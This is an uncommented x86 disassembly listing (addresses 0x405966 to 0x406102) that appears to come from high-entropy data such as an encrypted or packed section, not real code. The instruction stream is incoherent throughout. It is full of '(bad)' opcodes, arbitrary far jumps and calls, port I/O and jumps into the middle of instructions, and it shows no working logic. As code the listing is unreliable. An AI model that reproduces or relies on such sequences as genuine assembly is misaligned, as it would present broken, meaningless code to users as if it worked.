  405966:	stos   DWORD PTR es:[edi],eax
  405967:	pushf  
  405968:	cmc    
  405969:	sub    ecx,DWORD PTR [ebp-0x69]
  40596c:	ror    DWORD PTR [ebp-0x2c],cl
  40596f:	into   
  405970:	rol    DWORD PTR [edi+0x4e],cl
  405973:	mov    bh,0xb
  405975:	xchg   edi,eax
  405976:	ror    DWORD PTR [edi-0x76],0x24
  40597a:	add    DWORD PTR [esp+edi*1+0x1987c65f],ebx
  405981:	add    eax,0xea85c847
  405986:	inc    ebx
  405987:	clc    
  405988:	cli    
  405989:	int3   
  40598a:	fldenv [eax-0xd]
  40598d:	ficomp DWORD PTR [edx-0x4dda4e8b]
  405993:	push   ebp
  405994:	out    dx,al
  405995:	adc    eax,0x7ab57ca9
  40599a:	sub    al,0x7d
  40599c:	or     ebx,0xffffffe6
  40599f:	test   al,0x7b
  4059a1:	mov    eax,ds:0x4e30a94c
  4059a6:	inc    esp
  4059a7:	stos   BYTE PTR es:[edi],al
  4059a8:	jnp    0x4059eb
  4059aa:	fwait
  4059ab:	outs   dx,DWORD PTR ds:[esi]
  4059ac:	jmp    0xc93:0xa376bfdb
  4059b3:	xchg   edx,eax
  4059b4:	add    cl,BYTE PTR [esi+0x37]
  4059b7:	jle    0x40599a
  4059b9:	jno    0x4059c2
  4059bb:	popf   
  4059bc:	rcr    DWORD PTR [ebp-0x3b],cl
  4059bf:	push   edx
  4059c0:	mov    BYTE PTR [eax-0x36],ah
  4059c3:	rcr    DWORD PTR [esi],cl
  4059c5:	dec    eax
  4059c6:	mov    WORD PTR [eax-0x4c],ss
  4059c9:	push   ecx
  4059ca:	sbb    BYTE PTR [ebx+edi*1+0x66687b2c],0xeb
  4059d2:	inc    edx
  4059d3:	enter  0xecb4,0xdc
  4059d7:	imul   ebp,edi,0xffffffb7
  4059da:	add    ebp,esp
  4059dc:	nop
  4059dd:	(bad)  
  4059de:	lea    ebx,[esi-0xd]
  4059e1:	repz xchg ebx,eax
  4059e3:	jmp    0x8256645d
  4059e8:	imul   eax,DWORD PTR [eax-0x70],0x33
  4059ec:	div    DWORD PTR [eax-0x24]
  4059ef:	xchg   ecx,eax
  4059f0:	dec    edx
  4059f1:	cmp    al,0xba
  4059f3:	mov    ds:0xadc87d5b,al
  4059f8:	rol    BYTE PTR [esi+edx*4],cl
  4059fb:	mov    WORD PTR [eax+edx*4+0x6a828015],?
  405a02:	stc    
  405a03:	cmp    DWORD PTR [eax],ebx
  405a05:	fisubr DWORD PTR [edi]
  405a07:	gs xchg ebx,eax
  405a09:	mov    ds:0x1e2a11eb,al
  405a0e:	call   0xcbac:0xb5b72df5
  405a15:	imul   eax,DWORD PTR [edx+ebx*4+0x369c51cb],0xae4941a0
  405a20:	imul   edx,edi,0xffffff84
  405a23:	mov    fs,WORD PTR [edx+edi*4]
  405a26:	imul   esi,edi,0xc9c3182b
  405a2c:	ss cwde 
  405a2e:	mov    ecx,0xf9013e9a
  405a33:	test   DWORD PTR [esi-0x611e2c9c],eax
  405a39:	inc    esi
  405a3a:	enter  0x9489,0x9e
  405a3e:	push   edx
  405a3f:	fsub   DWORD PTR [ecx-0x6e]
  405a42:	push   ebx
  405a43:	adc    cl,dh
  405a45:	rol    DWORD PTR [esi],0x65
  405a48:	cmc    
  405a49:	pop    esi
  405a4a:	aad    0x77
  405a4c:	test   DWORD PTR [edi+edi*8],0x4b55c331
  405a53:	stc    
  405a54:	inc    edi
  405a55:	mov    eax,ds:0x4b4e594c
  405a5a:	jge    0x405ad4
  405a5c:	cli    
  405a5d:	cmp    eax,0xfba39fd2
  405a62:	dec    ebp
  405a63:	dec    edx
  405a64:	fadd   QWORD PTR [ebp-0xa7f64d9]
  405a6a:	inc    esp
  405a6b:	in     eax,0xff
  405a6d:	add    BYTE PTR [esi],0xaf
  405a70:	stc    
  405a71:	or     BYTE PTR [edi],dl
  405a73:	mov    ds:0x6d600e2d,eax
  405a78:	mov    al,ds:0x91809af
  405a7d:	out    dx,eax
  405a7e:	pop    ecx
  405a7f:	pop    ss
  405a80:	inc    edx
  405a81:	pushf  
  405a82:	mov    ch,0x7d
  405a84:	adc    DWORD PTR [edi+0x77],edi
  405a87:	xchg   ecx,eax
  405a88:	popa   
  405a89:	pushf  
  405a8a:	daa    
  405a8b:	ds shl esi,cl
  405a8e:	clc    
  405a8f:	push   esi
  405a90:	dec    edx
  405a91:	cdq    
  405a92:	xlat   BYTE PTR ds:[ebx]
  405a93:	out    dx,eax
  405a94:	scas   al,BYTE PTR es:[edi]
  405a95:	ins    DWORD PTR es:[edi],dx
  405a96:	call   0xb4c7da98
  405a9b:	ins    BYTE PTR es:[edi],dx
  405a9c:	mov    eax,ds:0x52555e0a
  405aa1:	sti    
  405aa2:	int3   
  405aa3:	js     0x405a8c
  405aa5:	lahf   
  405aa6:	sbb    esp,DWORD PTR [ebx]
  405aa8:	aad    0x54
  405aaa:	pushf  
  405aab:	xchg   ecx,eax
  405aac:	xor    esi,edi
  405aae:	add    esi,DWORD PTR [esi]
  405ab0:	and    al,0x52
  405ab2:	jnp    0x405a5f
  405ab4:	fidivr WORD PTR [ebp+eax*1-0x6d]
  405ab8:	daa    
  405ab9:	addr16 (bad) 
  405abb:	push   eax
  405abc:	add    DWORD PTR [esi],ecx
  405abe:	outs   dx,DWORD PTR ds:[esi]
  405abf:	call   0xbb5b:0xf13f564a
  405ac6:	sbb    al,0x9a
  405ac8:	fs jmp 0x405a64
  405acb:	inc    ebp
  405acc:	div    BYTE PTR [ecx+ecx*8+0x1a]
  405ad0:	jne    0x405a8a
  405ad2:	mov    ah,0x11
  405ad4:	mov    dl,0x60
  405ad6:	push   ss
  405ad7:	and    al,0xde
  405ad9:	aad    0x93
  405adb:	(bad)  
  405adc:	cld    
  405add:	stos   DWORD PTR es:[edi],eax
  405ade:	nop
  405adf:	leave  
  405ae0:	and    al,0x76
  405ae2:	mov    DWORD PTR [ebp+0x4a],esp
  405ae5:	repz retf 0x1544
  405ae9:	adc    al,0x91
  405aeb:	sbb    DWORD PTR [ecx],edx
  405aed:	mov    bh,0x1f
  405aef:	xchg   ebx,eax
  405af0:	sub    BYTE PTR [esi+ebp*8-0x21f31c29],bl
  405af7:	mov    edi,0xca330849
  405afc:	ret    0x5837
  405aff:	push   edi
  405b00:	dec    eax
  405b01:	in     eax,dx
  405b02:	mov    bl,0x65
  405b04:	push   edx
  405b05:	mov    bh,0xab
  405b07:	scas   eax,DWORD PTR es:[edi]
  405b08:	ja     0x405b38
  405b0a:	clc    
  405b0b:	mov    DWORD PTR [ebx],0x7c7cc4c7
  405b11:	pop    esp
  405b12:	mov    WORD PTR [eax],es
  405b14:	add    eax,0x9684cc8e
  405b19:	dec    eax
  405b1a:	lds    esp,FWORD PTR ds:0x7dd23f40
  405b20:	sbb    eax,0x508f0d88
  405b25:	push   0x4e4d05bd
  405b2a:	dec    edx
  405b2b:	pop    ss
  405b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b2d:	mov    bh,BYTE PTR [edx-0x7a685e33]
  405b33:	mov    ebx,0x6bc3b2a2
  405b38:	adc    eax,0x6b689b6d
  405b3d:	mov    WORD PTR [edi+ebp*4],?
  405b40:	or     edx,ebp
  405b42:	out    dx,eax
  405b43:	gs pushf 
  405b45:	push   ecx
  405b46:	sbb    bh,BYTE PTR [ebx]
  405b48:	push   cs
  405b49:	xor    BYTE PTR [edi+edx*8+0x8122fed],bh
  405b50:	call   0x6665a1b4
  405b55:	adc    BYTE PTR [ecx+edi*8-0x4b6e600e],0x91
  405b5d:	loopne 0x405b29
  405b5f:	or     DWORD PTR [bp+di],eax
  405b62:	or     bh,BYTE PTR [esi-0x6a]
  405b65:	aad    0xbc
  405b67:	pop    ebp
  405b68:	adc    BYTE PTR [ecx+eiz*8+0x64],dl
  405b6c:	dec    esi
  405b6d:	imul   ebx,edx,0xffffffbe
  405b70:	loop   0x405b30
  405b72:	icebp  
  405b73:	outs   dx,BYTE PTR ds:[esi]
  405b74:	sti    
  405b75:	aaa    
  405b76:	(bad)  
  405b77:	fucomp st(2)
  405b79:	in     eax,dx
  405b7a:	jl     0x405bbb
  405b7c:	inc    edx
  405b7d:	sbb    BYTE PTR [ebx-0x6245afe8],0x3c
  405b84:	ja     0x405bd4
  405b86:	xor    DWORD PTR [esi-0x11589550],edx
  405b8c:	push   ss
  405b8d:	adc    WORD PTR [edx-0x55],sp
  405b91:	(bad)  
  405b92:	dec    edx
  405b93:	ficom  WORD PTR [edx]
  405b95:	dec    eax
  405b96:	and    DWORD PTR [edx+0x49ba9d0d],0x8f92913d
  405ba0:	jle    0x405bfd
  405ba2:	in     al,dx
  405ba3:	out    0x61,al
  405ba5:	xor    eax,0x2f813070
  405baa:	xchg   edi,eax
  405bab:	inc    esi
  405bac:	mov    BYTE PTR [edx],al
  405bae:	out    0x66,eax
  405bb0:	jne    0x405b53
  405bb2:	jl     0x405bcd
  405bb4:	dec    ecx
  405bb5:	mov    ah,0xa1
  405bb7:	xor    BYTE PTR [edx-0x41],ch
  405bba:	imul   esi,DWORD PTR [ecx-0x1048f7da],0x42
  405bc1:	push   esp
  405bc2:	push   ds
  405bc3:	lahf   
  405bc4:	mov    bl,0x89
  405bc6:	lods   eax,DWORD PTR ds:[esi]
  405bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bc8:	pop    ds
  405bc9:	out    0xbe,al
  405bcb:	je     0x405bdc
  405bcd:	jmp    0x405c4d
  405bcf:	scas   eax,DWORD PTR es:[edi]
  405bd0:	cdq    
  405bd1:	dec    ebp
  405bd2:	adc    DWORD PTR [ebx],0xffffff8d
  405bd5:	aaa    
  405bd6:	mov    ds:0xe9ae675c,eax
  405bdb:	retf   0x9e26
  405bde:	lock xor DWORD PTR [ecx+0x11519b55],esp
  405be5:	pop    es
  405be6:	fld    QWORD PTR [ebx]
  405be8:	dec    ebp
  405be9:	daa    
  405bea:	iret   
  405beb:	add    al,0x81
  405bed:	ja     0x405bf3
  405bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bf0:	in     al,0x73
  405bf2:	pop    ds
  405bf3:	fld    st(1)
  405bf5:	scas   al,BYTE PTR es:[edi]
  405bf6:	push   es
  405bf7:	sbb    bh,ah
  405bf9:	(bad)  
  405bfa:	push   esi
  405bfb:	add    eax,0x91678480
  405c00:	jnp    0x405c15
  405c02:	xchg   BYTE PTR [esi-0x74],cl
  405c05:	xchg   ebp,eax
  405c06:	xor    esi,DWORD PTR [ebx-0x44cbb6f5]
  405c0c:	js     0x405bc7
  405c0e:	fcomp  QWORD PTR [edx]
  405c10:	nop
  405c11:	(bad)  
  405c12:	mov    edx,0x3e6b390b
  405c17:	xchg   esp,eax
  405c18:	xchg   DWORD PTR [edi+0x5],esi
  405c1b:	daa    
  405c1c:	dec    DWORD PTR [esi-0x1cc1ade1]
  405c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c23:	sbb    al,0x5a
  405c25:	hlt    
  405c26:	inc    ecx
  405c27:	sub    DWORD PTR [edx-0x37],0x7b
  405c2b:	addr16 pop ebp
  405c2d:	push   edx
  405c2e:	sub    al,0xf1
  405c30:	idiv   dl
  405c32:	jnp    0x405c40
  405c34:	mov    cl,0x7
  405c36:	pop    edx
  405c37:	(bad)  
  405c38:	sbb    eax,0x63030c18
  405c3d:	mov    al,ds:0x60be4a63
  405c42:	inc    ebx
  405c43:	div    BYTE PTR [ebp+0x155b878e]
  405c49:	sbb    edx,DWORD PTR [ebp+0x74]
  405c4c:	je     0x405cb5
  405c4e:	adc    DWORD PTR [esi-0x55],ecx
  405c51:	int    0xb1
  405c53:	imul   esp,DWORD PTR [ebx-0x76],0xa465835a
  405c5a:	fcomi  st,st(6)
  405c5c:	mov    BYTE PTR [ebp-0x47],bh
  405c5f:	(bad)  
  405c61:	pop    es
  405c62:	cmc    
  405c63:	inc    ebx
  405c64:	dec    ecx
  405c65:	xchg   ebp,eax
  405c66:	shl    BYTE PTR ds:[ebx+0x19],0xe1
  405c6b:	dec    edx
  405c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c6d:	mov    ah,0xaf
  405c6f:	in     al,dx
  405c70:	mov    eax,ds:0xe7b492f9
  405c75:	jmp    0x3519:0xd1fb5550
  405c7c:	dec    eax
  405c7d:	mov    dh,0xd5
  405c7f:	repz (bad) 
  405c81:	jle    0x405c18
  405c83:	(bad)  [eax+0x57]
  405c86:	(bad)  
  405c87:	(bad)  
  405c88:	out    0x17,eax
  405c8a:	and    eax,0x132b4943
  405c8f:	or     eax,0x7344b42d
  405c94:	(bad)  
  405c95:	push   edx
  405c96:	inc    esp
  405c97:	in     al,0x87
  405c99:	sub    esp,ecx
  405c9b:	inc    ebx
  405c9c:	pop    ebx
  405c9d:	cmp    eax,0x89707f28
  405ca2:	xchg   esi,eax
  405ca3:	mov    ebx,0xc84e5561
  405ca8:	sbb    BYTE PTR [eax+0x404c9ef5],bl
  405cae:	xchg   ebx,eax
  405caf:	imul   esp,DWORD PTR [edx+0x142fef27],0xfffffff4
  405cb6:	pop    esi
  405cb7:	mov    al,0xea
  405cb9:	jmp    0x405c97
  405cbb:	inc    edx
  405cbc:	push   0x96cb1f4f
  405cc1:	mov    eax,0xf80c0de6
  405cc6:	or     eax,0xef443d08
  405ccb:	push   edx
  405ccc:	adc    al,0x80
  405cce:	mov    eax,0x4ab48b2f
  405cd3:	aad    0x47
  405cd5:	rcr    esp,cl
  405cd7:	outs   dx,DWORD PTR ds:[esi]
  405cd8:	fs pop esp
  405cda:	xchg   ecx,eax
  405cdb:	push   esi
  405cdc:	push   esi
  405cdd:	push   edi
  405cde:	jge    0x405cf8
  405ce0:	inc    edx
  405ce1:	xchg   esp,eax
  405ce2:	imul   esi,ebp,0xde005b03
  405ce8:	ins    DWORD PTR es:[edi],dx
  405ce9:	std    
  405cea:	dec    edi
  405ceb:	pop    edx
  405cec:	and    ecx,DWORD PTR [ebx-0x76de57b5]
  405cf2:	sub    ebx,DWORD PTR [ecx-0x2224f1c7]
  405cf8:	std    
  405cf9:	mov    al,BYTE PTR [esp+ebx*2+0x1867ce2f]
  405d00:	in     al,0xa5
  405d02:	or     eax,0x9bfc198e
  405d07:	sti    
  405d08:	fst    DWORD PTR [esp+esi*8]
  405d0b:	das    
  405d0c:	in     al,0xc6
  405d0e:	aaa    
  405d0f:	push   0xffffff8a
  405d11:	jmp    0x7aa2f8a9
  405d16:	mov    edx,0x3adc77fa
  405d1b:	add    eax,0xab3e95a0
  405d20:	mov    ecx,0x1679d77d
  405d25:	(bad)  [ecx]
  405d27:	loopne 0x405d20
  405d29:	mov    ch,0x20
  405d2b:	xchg   edi,eax
  405d2c:	inc    ebp
  405d2d:	inc    ebp
  405d2e:	pop    ds
  405d2f:	mov    ds,ax
  405d32:	xor    bh,BYTE PTR [ebx]
  405d34:	pop    es
  405d35:	pop    eax
  405d36:	or     DWORD PTR [ecx+eax*1],eax
  405d39:	adc    bl,BYTE PTR [esi+ebp*4+0xf]
  405d3d:	enter  0xe816,0xfd
  405d41:	xchg   ebx,eax
  405d42:	sbb    al,0xce
  405d44:	or     edx,DWORD PTR [esi]
  405d46:	leave  
  405d47:	sub    BYTE PTR [edi],cl
  405d49:	xchg   ebp,eax
  405d4a:	into   
  405d4b:	outs   dx,BYTE PTR ds:[esi]
  405d4c:	aas    
  405d4d:	mov    BYTE PTR [edi+0x48],cl
  405d50:	into   
  405d51:	and    al,0x92
  405d53:	push   eax
  405d54:	or     BYTE PTR [edi+0x5cf923cc],bl
  405d5a:	push   cs
  405d5b:	mov    esi,0x1e16769e
  405d60:	cmpxchg BYTE PTR [ebx],bh
  405d63:	(bad)  
  405d64:	xchg   ebp,eax
  405d65:	mov    esi,0x1ebab847
  405d6a:	loopne 0x405daf
  405d6c:	cmp    cl,bl
  405d6e:	xchg   ecx,eax
  405d6f:	mov    dl,BYTE PTR [esi+0x1b71d17a]
  405d75:	popaw  
  405d77:	or     eax,0x42d0425b
  405d7c:	sub    eax,0xf8025a1b
  405d81:	jp     0x405d5a
  405d83:	xchg   ebx,eax
  405d84:	out    dx,eax
  405d85:	cdq    
  405d86:	xor    bl,BYTE PTR [edx-0x1cd41fe2]
  405d8c:	sbb    al,0x76
  405d8e:	test   DWORD PTR [ebp+0x42cac8bc],esi
  405d94:	ror    bh,1
  405d96:	push   esi
  405d97:	sbb    bl,al
  405d99:	cs std 
  405d9b:	clc    
  405d9c:	dec    esi
  405d9d:	dec    esp
  405d9e:	sub    edi,DWORD PTR [ebp+0x58]
  405da1:	loopne 0x405e04
  405da3:	lods   al,BYTE PTR ds:[esi]
  405da4:	dec    eax
  405da5:	test   al,0x45
  405da7:	retf   
  405da8:	mov    esi,0x6dd6b99
  405dad:	out    0xbb,al
  405daf:	retf   
  405db0:	shl    DWORD PTR [ecx+0x31],cl
  405db3:	xor    cl,BYTE PTR [ebx]
  405db5:	aas    
  405db6:	xchg   edx,eax
  405db7:	repz adc ah,BYTE PTR [edi-0x40053a7c]
  405dbe:	aad    0x56
  405dc0:	cmovs  esi,DWORD PTR [ebp+0x7b]
  405dc4:	mov    edi,0x348a1668
  405dc9:	mov    ss,WORD PTR [ebp+0x7b731693]
  405dcf:	inc    edx
  405dd0:	mov    esp,gs
  405dd2:	mov    eax,ds:0xeb4b2afd
  405dd7:	es adc dl,dh
  405dda:	aam    0xd1
  405ddc:	ret    
  405ddd:	test   edi,esp
  405ddf:	stos   DWORD PTR es:[edi],eax
  405de0:	cmp    BYTE PTR [ebx-0x22],cl
  405de3:	cwde   
  405de4:	call   0x206541d5
  405de9:	adc    al,0x4e
  405deb:	mov    eax,0xb5efda7a
  405df0:	ror    ebx,0x1
  405df3:	xor    bl,dh
  405df5:	add    BYTE PTR [eax],cl
  405df7:	pusha  
  405df8:	fnstcw WORD PTR [edx-0x38f38879]
  405dfe:	jo     0x405e71
  405e00:	adc    eax,0xe76cd0e
  405e05:	mov    edi,0x36f7762b
  405e0a:	popf   
  405e0b:	call   0xd973:0x917c070e
  405e12:	push   ebx
  405e13:	mov    al,ds:0xa6800956
  405e18:	fist   DWORD PTR [ebp-0x6ae30346]
  405e1e:	nop
  405e1f:	inc    edx
  405e20:	jns    0x405e90
  405e22:	push   es
  405e23:	fbld   TBYTE PTR [esi-0x2d]
  405e26:	lahf   
  405e27:	sar    DWORD PTR [ebx-0x37],1
  405e2a:	icebp  
  405e2b:	(bad)  
  405e2c:	jmp    0x405dec
  405e2e:	jns    0x405de0
  405e30:	loope  0x405e1c
  405e32:	fild   DWORD PTR [edx+0x1ddf4f2d]
  405e38:	xchg   BYTE PTR [esi],bh
  405e3a:	data16 and BYTE PTR [eax-0x3dba8889],ah
  405e41:	push   edx
  405e42:	jne    0x405eae
  405e44:	cdq    
  405e45:	(bad)  
  405e46:	inc    esp
  405e47:	fild   WORD PTR [ebp-0x79]
  405e4a:	cdq    
  405e4b:	pop    eax
  405e4c:	je     0x405e16
  405e4e:	hlt    
  405e4f:	cmp    cl,BYTE PTR [ecx+0x4d]
  405e52:	adc    eax,0x101f3d82
  405e57:	add    cl,cl
  405e59:	dec    edx
  405e5a:	fcmovb st,st(6)
  405e5c:	sbb    eax,0xa8e046b7
  405e61:	xor    ecx,DWORD PTR [ebp+0x71]
  405e64:	pop    edx
  405e65:	shr    eax,cl
  405e67:	mov    dh,0x21
  405e69:	test   eax,0x43f2b77e
  405e6e:	shl    DWORD PTR [ecx+edi*1],cl
  405e71:	and    ch,BYTE PTR [edx+ecx*2]
  405e74:	cmp    dl,0x1d
  405e77:	or     dl,dh
  405e79:	imul   edi,edx,0x37
  405e7c:	inc    ebp
  405e7d:	add    BYTE PTR [esi+0x3d],0xbd
  405e81:	dec    ebp
  405e82:	add    BYTE PTR [eax-0x5a3d8795],al
  405e88:	pop    ss
  405e89:	cdq    
  405e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e8b:	test   BYTE PTR [ecx+0x54],0x2e
  405e8f:	fstp   DWORD PTR [edx]
  405e91:	xor    BYTE PTR [ecx+0x422067e9],dl
  405e97:	pop    ebx
  405e98:	scas   al,BYTE PTR es:[edi]
  405e99:	dec    esp
  405e9a:	jmp    0x7854c545
  405e9f:	push   eax
  405ea0:	dec    BYTE PTR [eax-0x7b]
  405ea3:	pop    edi
  405ea4:	xor    al,0x63
  405ea6:	push   edi
  405ea7:	hlt    
  405ea8:	cs popa 
  405eaa:	pop    ds
  405eab:	adc    BYTE PTR [esi+esi*1+0x29f6d7d4],cl
  405eb2:	xchg   esi,eax
  405eb3:	int    0x92
  405eb5:	jb     0x405e64
  405eb7:	leave  
  405eb8:	out    dx,al
  405eb9:	fsubr  QWORD PTR [ebp-0x7250da7f]
  405ebf:	sub    al,0xe
  405ec1:	fcomp  st(4)
  405ec3:	bound  edx,QWORD PTR [esp+esi*8-0x61]
  405ec7:	mov    esi,0x3bb603cf
  405ecc:	cli    
  405ecd:	jb     0x405f14
  405ecf:	add    eax,0xe6df1b9b
  405ed4:	jmp    0x405ebb
  405ed6:	pop    ecx
  405ed7:	jb     0x405e77
  405ed9:	jns    0x405e9f
  405edb:	mov    WORD PTR [ebp-0x5c657ba4],ss
  405ee1:	dec    ebx
  405ee2:	int3   
  405ee3:	mov    edi,0xd5cbd648
  405ee8:	(bad)  
  405ee9:	cli    
  405eea:	sub    BYTE PTR [edx],0x46
  405eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eee:	mov    BYTE PTR [ebp-0x68e553f0],dh
  405ef4:	ss scas eax,DWORD PTR es:[edi]
  405ef6:	lock outs dx,BYTE PTR ds:[esi]
  405ef8:	push   edx
  405ef9:	ror    dl,0xad
  405efc:	mov    cl,0x16
  405efe:	adc    eax,0xd989d53e
  405f03:	cmp    esp,edx
  405f05:	lea    edx,[edi+ebp*2+0x76]
  405f09:	push   ss
  405f0a:	mov    dh,0xcb
  405f0c:	and    ah,BYTE PTR ds:0x7de593b5
  405f12:	sbb    eax,0x8f7a875c
  405f17:	add    al,0xc4
  405f19:	jmp    0x405f7c
  405f1b:	xchg   esi,eax
  405f1c:	sbb    eax,DWORD PTR [edx-0x4b]
  405f1f:	out    dx,al
  405f20:	cdq    
  405f21:	out    dx,eax
  405f22:	(bad)  
  405f23:	sbb    ah,dl
  405f25:	in     eax,dx
  405f26:	cmp    BYTE PTR [ebx+0x6a],cl
  405f29:	lds    ebx,FWORD PTR [edi+0x76]
  405f2c:	mov    eax,ds:0x48e49ad0
  405f31:	shr    DWORD PTR [edx+ebx*1+0x36],1
  405f35:	adc    eax,0x1ccc4910
  405f3a:	std    
  405f3b:	fbstp  TBYTE PTR [edi]
  405f3d:	inc    eax
  405f3e:	dec    eax
  405f3f:	out    0x7f,eax
  405f41:	and    eax,0x51696624
  405f46:	or     esp,DWORD PTR [ecx+0x3f]
  405f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f4a:	fadd   st,st(2)
  405f4c:	test   edi,esi
  405f4e:	dec    ebx
  405f4f:	or     eax,0x25e61d65
  405f54:	mov    edx,0x3d4de1a
  405f59:	fmul   QWORD PTR [edx-0x34]
  405f5c:	sbb    ah,BYTE PTR [edi-0x739c6f31]
  405f62:	or     BYTE PTR [edx-0x6f0be531],bl
  405f68:	out    0x50,eax
  405f6a:	test   DWORD PTR [eax-0x66250f16],0x38cbb6bf
  405f74:	adc    bh,BYTE PTR [edi-0x5c0e12d8]
  405f7a:	adc    BYTE PTR [esi+0x75b4cbd5],al
  405f80:	dec    edi
  405f81:	push   esp
  405f82:	inc    edx
  405f83:	push   edx
  405f84:	mov    ah,0x53
  405f86:	jae    0x405fd5
  405f88:	in     eax,dx
  405f89:	dec    ebp
  405f8a:	xchg   ebx,eax
  405f8b:	push   ebp
  405f8c:	mov    bh,0x54
  405f8e:	mov    ecx,0x28698c1b
  405f93:	pop    ebp
  405f94:	xchg   ebx,eax
  405f95:	xchg   edi,eax
  405f96:	xchg   esi,eax
  405f97:	ins    BYTE PTR es:[edi],dx
  405f98:	sbb    eax,0x7c174597
  405f9d:	jl     0x405f78
  405f9f:	call   0xa2ae:0x8847c21a
  405fa6:	mov    bh,0xcd
  405fa8:	adc    eax,0x726f5799
  405fad:	popf   
  405fae:	mov    dh,0x20
  405fb0:	mov    al,ds:0xd5608d96
  405fb5:	pop    esi
  405fb6:	fcomp  QWORD PTR [esp+edi*1]
  405fb9:	ret    
  405fba:	mov    ebp,0x31cc82b7
  405fbf:	in     eax,dx
  405fc0:	hlt    
  405fc1:	mov    WORD PTR [edx+eax*1-0x5c970de4],fs
  405fc8:	cld    
  405fc9:	sub    BYTE PTR [ebx+0x38],dl
  405fcc:	(bad)  
  405fcd:	adc    ah,BYTE PTR [esi-0x3a]
  405fd0:	out    0x44,eax
  405fd2:	mov    ah,0x47
  405fd4:	add    edx,edx
  405fd6:	pop    esp
  405fd7:	lahf   
  405fd8:	adc    ah,BYTE PTR [esi-0x4acdeda]
  405fde:	inc    edi
  405fdf:	pop    ebx
  405fe0:	cs inc ecx
  405fe2:	xor    eax,0x8fb4f21a
  405fe8:	cmp    BYTE PTR [edx+0x56],bl
  405feb:	cmp    ebp,DWORD PTR [esi]
  405fed:	add    BYTE PTR ds:0x63ff645d,0xb
  405ff4:	sub    DWORD PTR [ebp-0x5989083],ebp
  405ffa:	xchg   ebx,eax
  405ffb:	and    eax,0x45e0c11
  406000:	dec    edi
  406001:	pop    es
  406002:	xchg   ebp,eax
  406003:	and    eax,0x942021d1
  406008:	fcmovnu st,st(2)
  40600a:	cs pop es
  40600c:	(bad)  
  40600d:	repnz ins BYTE PTR es:[edi],dx
  40600f:	pop    ds
  406010:	xchg   ebx,eax
  406011:	sahf   
  406012:	jbe    0x406008
  406014:	iret   
  406015:	cmp    DWORD PTR [ebp+ecx*1+0x22],ecx
  406019:	ja     0x405fdb
  40601b:	pop    eax
  40601c:	adc    ah,BYTE PTR [ebx+0x1b]
  40601f:	push   edi
  406020:	inc    ebx
  406021:	movd   DWORD PTR [esp+edi*2],mm0
  406025:	pop    esi
  406026:	pop    edx
  406027:	lds    eax,FWORD PTR [ebx]
  406029:	adc    al,0xfe
  40602b:	iret   
  40602c:	xchg   esi,eax
  40602d:	xchg   ecx,eax
  40602e:	xchg   ebx,eax
  40602f:	dec    eax
  406030:	pop    ebp
  406031:	cmc    
  406032:	mov    ah,0xd9
  406034:	cmp    eax,0x24c7c94
  406039:	push   esp
  40603a:	fcmovu st,st(4)
  40603c:	jae    0x406077
  40603e:	xlat   BYTE PTR ds:[ebx]
  40603f:	jmp    0xa3a3:0xd0c64dec
  406046:	sub    ebp,esp
  406048:	and    al,0xa6
  40604a:	fbstp  TBYTE PTR [ebx+edx*1+0x79bf8dbe]
  406051:	jno    0x40603a
  406053:	and    ebp,esi
  406055:	or     eax,0x9b8a6388
  40605a:	push   eax
  40605b:	jno    0x406065
  40605d:	sbb    al,0x56
  40605f:	inc    edx
  406060:	pop    esi
  406061:	aas    
  406062:	push   cs
  406063:	push   ebp
  406064:	ja     0x4060ad
  406066:	jl     0x40609d
  406068:	jle    0x406085
  40606a:	pusha  
  40606b:	sbb    BYTE PTR [ebx],dl
  40606d:	pop    eax
  40606e:	pop    ss
  40606f:	pop    ebx
  406070:	retf   
  406071:	mov    dl,0x17
  406073:	dec    ebp
  406074:	or     al,0x86
  406076:	fadd   QWORD PTR [esi]
  406078:	mov    DWORD PTR [esp+ecx*2-0x185d7c02],ebp
  40607f:	(bad)  
  406080:	pusha  
  406081:	or     DWORD PTR fs:[ebx+0x3f],eax
  406085:	xchg   ebp,eax
  406086:	xchg   BYTE PTR [edx],bl
  406088:	imul   DWORD PTR [ecx+0x3c5fef18]
  40608e:	add    ch,bl
  406090:	sti    
  406091:	pop    ecx
  406092:	pusha  
  406093:	xchg   BYTE PTR [ecx+0x7f4ffab4],cl
  406099:	and    al,0xa
  40609b:	ja     0x406053
  40609d:	pop    es
  40609e:	lods   eax,DWORD PTR gs:[esi]
  4060a0:	inc    edi
  4060a1:	fstp   DWORD PTR [edi-0x2b]
  4060a4:	adc    al,0xf1
  4060a6:	mov    al,ds:0xb9e395bd
  4060ab:	and    ch,bl
  4060ad:	fisubr WORD PTR ds:0x82161fd2
  4060b3:	mov    cl,0xa1
  4060b5:	jae    0x406068
  4060b7:	inc    ecx
  4060b8:	pushf  
  4060b9:	add    al,0x8b
  4060bb:	mov    esi,0xbe9fb568
  4060c0:	jae    0x4060d8
  4060c2:	mov    edi,DWORD PTR [ebx-0x4c43fb5e]
  4060c8:	xor    eax,0x5cf2633c
  4060cd:	add    ch,BYTE PTR [edx+eiz*1]
  4060d0:	les    eax,FWORD PTR [edx*1-0x7817f0e1]
  4060d7:	mov    cl,0xb3
  4060d9:	cdq    
  4060da:	stos   DWORD PTR es:[edi],eax
  4060db:	scas   eax,DWORD PTR es:[edi]
  4060dc:	push   edi
  4060dd:	push   0x8
  4060df:	lea    edi,[edi]
  4060e1:	repnz retf 
  4060e3:	mov    al,0x68
  4060e5:	pop    esi
  4060e6:	pop    ds
  4060e7:	inc    ebx
  4060e8:	shr    BYTE PTR [esp+ebx*4-0x4f],0x81
  4060ed:	push   es
  4060ee:	data16 or dl,ch
  4060f1:	icebp  
  4060f2:	sahf   
  4060f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060f4:	pop    esp
  4060f5:	es pop esp
  4060f7:	shr    DWORD PTR [eax+eax*1-0x4a],0xab
  4060fc:	leave  
  4060fd:	out    dx,al
  4060fe:	inc    edx
  4060ff:	or     dh,bl
  406101:	push   ds
  406102:	lods   eax,DWORD PTR ds:[esi]
